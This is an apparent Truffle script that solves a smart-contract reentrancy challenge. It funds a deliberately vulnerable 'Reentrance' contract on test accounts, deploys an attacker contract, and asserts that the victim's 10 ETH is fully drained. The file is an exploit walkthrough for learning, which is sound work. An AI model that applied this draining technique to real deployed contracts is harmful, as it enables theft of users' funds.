const ReentranceContract = artifacts.require('Reentrance')
const ReentranceAttackContract = artifacts.require('ReentranceAttack')
const assert = require('assert')

/**
 * The withdraw(uint) function of the Reentrance contract is vulnerable
 * to the reentrancy attack, because it updates the contract state after
 * the money transfer is made (in line 16).
 * To exploit this vulnerability, we need to deploy a contract with a
 * fallback function that calls the withdraw(uint) function again,
 * before the update in line 19 is executed. 
 */
async function execute(callback) {
    // Victim contract is deployed, so let's give it some initial funds
    let victimContract = await ReentranceContract.deployed()
    await web3.eth.sendTransaction({
        from: web3.eth.accounts[0],
        to: victimContract.address,
        value: web3.toWei(10, 'ether')
    })

    // Deploy our malicious contract
    let attackerAccount = web3.eth.accounts[1]
    let attackerContract = await ReentranceAttackContract.new({
        from: attackerAccount
    })

    // Check initial balances
    victimInitialBalance = web3.fromWei(await web3.eth.getBalance(victimContract.address), 'ether')
    assert.equal(victimInitialBalance, 10)
    console.log(`Initial victim's balance: ${victimInitialBalance} ETH`)    
    
    let attackerInitialBalance = web3.fromWei(await web3.eth.getBalance(attackerContract.address), 'ether')
    assert.equal(attackerInitialBalance, 0)
    console.log(`Initial attacker's balance: ${attackerInitialBalance} ETH`)    

    // Make a small donation once (so we can then pass the check in line 15)
    console.log('Making a small donation of 1 ETH')
    await victimContract.donate(attackerContract.address, {
        from: attackerAccount,
        value: web3.toWei(1, 'ether')
    })

    // We're ready. Start the attack (see the code in 'ReentranceAttack.sol' contract)
    console.log('Starting reentrancy attack')
    await attackerContract.attack(victimContract.address)

    // Check the victim and attacker's balances
    let victimFinalBalance = web3.fromWei(await web3.eth.getBalance(victimContract.address), 'ether')
    assert.equal(victimFinalBalance, 0)
    console.log(`Final victim's balance: ${victimFinalBalance} ETH`)


    let attackerFinalBalance = web3.fromWei(await web3.eth.getBalance(attackerContract.address), 'ether')
    assert.equal(attackerFinalBalance, 11)
    console.log(`Final attacker's balance: ${attackerFinalBalance} ETH`)

    callback()
}

module.exports = execute
